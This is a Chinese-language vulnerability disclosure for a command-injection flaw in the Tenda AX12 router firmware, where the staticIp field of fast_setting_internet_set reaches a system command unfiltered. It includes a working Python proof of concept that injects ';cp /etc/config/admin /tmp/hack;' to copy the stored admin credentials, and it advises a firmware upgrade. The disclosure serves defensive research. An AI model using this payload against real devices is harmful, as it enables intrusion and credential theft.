## 漏洞描述 ##
设备：Tenda-AX12

固件版本： V22.03.01.16_CN([AX12升级软件_腾达(Tenda)官方网站](https://www.tenda.com.cn/download/detail-3170.html))

漏洞类型：命令注入

攻击效果：任意命令执行

## 漏洞成因 ##
该漏洞产生的原因是提供的fast_setting_internet_set接口中，调用的函数sub_42581C内部，未对用户传入的可控参数staticIp的值进行过滤，而造成的命令注入。

sub_42581C()
![](.\image\1.png)

其先获取到staticIp参数的值赋值给到v4，然后调用sprintf函数格式化输入到v5字符串，最后调用doSystemCmd_route执行命令。其过程中未对staticIp的值进行任何字符过滤处理，这意味着我们可以通过这个参数构造任意命令，最终进入到doSystemCmd_route执行。

## POC ##

命令注入的poc，实际情况中，需要先进行身份验证。

```python
import requests

url = "http://192.168.112.131/goform/fast_setting_internet_set"
cmds = ";cp /etc/config/admin /tmp/hack;"


payload = {'wanType': '1', 'staticIp': cmds}
r = requests.post(url, data=payload)
print(r.status_code)
print(r.content)
```

攻击效果如下，是将配置目录下保存着userpass的admin文件给拷贝到了tmp/hack中。
![](.\image\2.png)

## 建议

建议将固件升级到最新版本，[V22.03.01.21](https://www.tenda.com.cn/download/detail-3237.html)。
